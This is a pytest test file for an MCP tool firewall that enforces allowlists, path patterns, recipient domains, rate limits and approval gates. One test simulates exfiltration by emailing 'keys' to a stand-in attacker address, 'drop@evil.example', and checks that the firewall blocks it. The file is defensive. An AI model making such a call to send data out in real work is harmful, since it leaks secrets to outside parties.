"""The policy in front of the real tool servers: calls it refuses never reach them."""

import pytest
from mcp import Client

from agent_firewall.policy import PolicyEngine, load
from agent_firewall.proxy.server import Upstream, build_firewall
from agent_firewall.tools import email_outbox, files

pytestmark = pytest.mark.anyio

POLICY = """
[tools."files__read_file"]
rate = { calls = 3, per_seconds = 60 }

[tools."files__read_file".args.path]
pattern = "logs/[a-z0-9._-]+"

[tools."email__send_report"]

[tools."email__send_report".args.to]
domains = ["example.com"]
max_length = 3
"""


@pytest.fixture
def setup(tmp_path):
    shared = tmp_path / "shared"
    (shared / "logs").mkdir(parents=True)
    (shared / "logs" / "auth.log").write_bytes(b"Failed password for root\n")
    (shared / "notes.txt").write_bytes(b"private notes")
    policy_file = tmp_path / "policy.toml"
    policy_file.write_text(POLICY)
    outbox = tmp_path / "outbox"
    firewall = build_firewall(
        [
            Upstream("files", files.build_server(shared)),
            Upstream("email", email_outbox.build_server(outbox)),
        ],
        policy=PolicyEngine(load(policy_file)),
    )
    return firewall, outbox


def text(result):
    return "\n".join(block.text for block in result.content)


async def test_only_tools_the_policy_names_are_listed(setup):
    firewall, _ = setup
    async with Client(firewall) as c:
        names = {t.name for t in (await c.list_tools()).tools}
        hidden = await c.call_tool("files__list_files", {})
    assert names == {"files__read_file", "email__send_report"}
    assert hidden.is_error and "POL01" in text(hidden)


async def test_argument_rules_stop_calls_before_the_server(setup):
    firewall, _ = setup
    async with Client(firewall) as c:
        allowed = await c.call_tool("files__read_file", {"path": "logs/auth.log"})
        outside_logs = await c.call_tool("files__read_file", {"path": "notes.txt"})
        wrong_type = await c.call_tool("files__read_file", {"path": ["logs/auth.log"]})
    assert text(allowed) == "Failed password for root\n"
    assert outside_logs.is_error and "POL03" in text(outside_logs)
    assert "private notes" not in text(outside_logs)
    assert wrong_type.is_error and "POL02" in text(wrong_type)


async def test_reports_to_other_domains_never_reach_the_outbox(setup):
    firewall, outbox = setup
    async with Client(firewall) as c:
        stolen = await c.call_tool(
            "email__send_report",
            {"to": ["soc@example.com", "drop@evil.example"], "subject": "s", "body": "keys"},
        )
        fine = await c.call_tool(
            "email__send_report", {"to": ["soc@example.com"], "subject": "s", "body": "ok"}
        )
    assert stolen.is_error and "POL03" in text(stolen)
    assert not fine.is_error
    assert len(list(outbox.iterdir())) == 1  # only the allowed one


async def test_rate_limit_through_the_firewall(setup):
    firewall, _ = setup
    async with Client(firewall) as c:
        results = [
            await c.call_tool("files__read_file", {"path": "logs/auth.log"}) for _ in range(4)
        ]
    assert [r.is_error for r in results] == [False, False, False, True]
    assert "POL04" in text(results[-1])


async def test_ask_means_no_until_approvals_exist(tmp_path):
    policy_file = tmp_path / "policy.toml"
    policy_file.write_text('[tools."email__send_report"]\nask = true\n')
    outbox = tmp_path / "outbox"
    firewall = build_firewall(
        [Upstream("email", email_outbox.build_server(outbox))],
        policy=PolicyEngine(load(policy_file)),
    )
    async with Client(firewall) as c:
        result = await c.call_tool(
            "email__send_report", {"to": ["soc@example.com"], "subject": "s", "body": "b"}
        )
    assert result.is_error and "POL05" in text(result) and "approval" in text(result)
    assert not list(outbox.iterdir())
